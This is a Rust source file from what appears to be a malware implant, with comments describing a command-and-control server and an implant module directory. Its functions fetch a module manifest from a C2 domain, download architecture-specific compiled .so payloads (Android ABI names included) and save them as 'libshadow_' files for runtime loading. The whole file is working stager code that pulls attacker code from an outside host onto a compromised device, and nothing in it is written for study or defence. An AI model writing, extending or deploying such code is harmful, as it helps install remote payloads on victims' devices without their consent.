//! Module downloader — fetches compiled .so modules from Cloudflare R2 and drops them
//! into the implant's private module directory for runtime loading.

use anyhow::Result;
use std::path::{Path, PathBuf};
use tracing::{error, info};

/// Download a single module from the C2's module delivery endpoint.
/// URL format: https://<domain>/modules/<arch>/<name>.so
pub async fn download_module(domain: &str, arch: &str, name: &str, dest_dir: &Path) -> Result<PathBuf> {
    let url = format!("https://{}/modules/{}/{}.so", domain, arch, name);
    info!("Downloading module: {}", url);

    let client = reqwest::Client::builder()
        .danger_accept_invalid_certs(false)
        .build()?;

    let resp = client.get(&url).send().await?;
    if !resp.status().is_success() {
        return Err(anyhow::anyhow!("Module download failed: HTTP {}", resp.status()));
    }

    let bytes = resp.bytes().await?;
    if bytes.is_empty() {
        return Err(anyhow::anyhow!("Module download returned empty body"));
    }

    // Ensure destination directory exists
    std::fs::create_dir_all(dest_dir)?;

    let dest = dest_dir.join(format!("libshadow_{}.so", name));
    std::fs::write(&dest, &bytes)?;
    info!("Module saved: {:?} ({} bytes)", dest, bytes.len());

    Ok(dest)
}

/// Download the module manifest from the C2.
/// URL format: https://<domain>/modules/manifest.json
pub async fn download_manifest(domain: &str) -> Result<serde_json::Value> {
    let url = format!("https://{}/modules/manifest.json", domain);
    info!("Fetching module manifest from {}", url);

    let client = reqwest::Client::builder().build()?;
    let resp = client.get(&url).send().await?;
    if !resp.status().is_success() {
        return Err(anyhow::anyhow!("Manifest fetch failed: HTTP {}", resp.status()));
    }

    let manifest: serde_json::Value = resp.json().await?;
    Ok(manifest)
}

/// Full sync: download manifest, then download all modules listed in it.
/// Returns the paths of successfully downloaded modules.
pub async fn sync_modules(domain: &str, module_dir: &Path) -> Vec<PathBuf> {
    let mut downloaded = Vec::new();
    let arch = detect_arch();

    match download_manifest(domain).await {
        Ok(manifest) => {
            if let Some(modules) = manifest.get("modules").and_then(|m| m.as_array()) {
                for module in modules {
                    if let Some(name) = module.get("name").and_then(|n| n.as_str()) {
                        match download_module(domain, arch, name, module_dir).await {
                            Ok(path) => downloaded.push(path),
                            Err(e) => error!("Failed to download module '{}': {}", name, e),
                        }
                    }
                }
            }
        }
        Err(e) => error!("Failed to fetch manifest: {}", e),
    }

    downloaded
}

fn detect_arch() -> &'static str {
    #[cfg(target_arch = "aarch64")]
    { "arm64-v8a" }
    #[cfg(target_arch = "arm")]
    { "armeabi-v7a" }
    #[cfg(target_arch = "x86_64")]
    { "x86_64" }
    #[cfg(not(any(target_arch = "aarch64", target_arch = "arm", target_arch = "x86_64")))]
    { "unknown" }
}
